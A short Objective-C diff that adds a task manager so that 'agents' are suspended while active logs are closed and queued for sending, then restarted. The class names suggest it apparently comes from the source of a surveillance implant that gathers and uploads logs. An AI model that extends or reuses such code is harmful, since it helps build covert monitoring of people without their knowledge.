@@ -13,6 +13,7 @@
 #import "NSMutableData+AES128.h"
 #import "FSNetworkOperation.h"
 #import "RCSILogManager.h"
+#import "RCSITaskManager.h"
 
 #import "NSString+SHA1.h"
 #import "NSData+SHA1.h"
@@ -202,9 +203,12 @@
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   RCSILogManager *logManager = [RCSILogManager sharedInstance];
+  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
+  
+  [taskManager suspendAgents];
   
   //
-  // Close active logs and move them to the send queue
+  // Logs to the send queue
   //
   if ([logManager closeActiveLogsAndContinueLogging: TRUE] == YES)
     {
@@ -218,6 +222,8 @@
       errorLog(@"An error occurred while closing active logs (non-fatal)");
 #endif
     }
+  
+  [taskManager restartAgents];
   
   NSEnumerator *enumerator = [logManager getSendQueueEnumerator];
   id anObject;
